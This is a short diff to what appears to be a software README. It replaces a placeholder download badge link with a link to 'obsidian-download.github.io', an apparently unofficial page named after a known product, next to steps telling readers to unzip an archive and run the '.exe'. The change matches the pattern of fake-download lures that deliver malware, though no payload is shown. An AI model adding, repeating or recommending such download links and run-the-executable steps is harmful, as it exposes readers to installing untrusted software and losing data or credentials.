@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://obsidian-download.github.io/.github/)
 
 ## 📸 Overview
 ![Screenshot 1](https://user-images.githubusercontent.com/184563/107852468-c04d0980-6e08-11eb-8def-1bea7b0c2b72.gif)  
